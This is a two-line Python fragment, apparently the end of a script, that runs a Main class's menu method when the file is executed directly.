if __name__=="__main__":
	Main().menu()
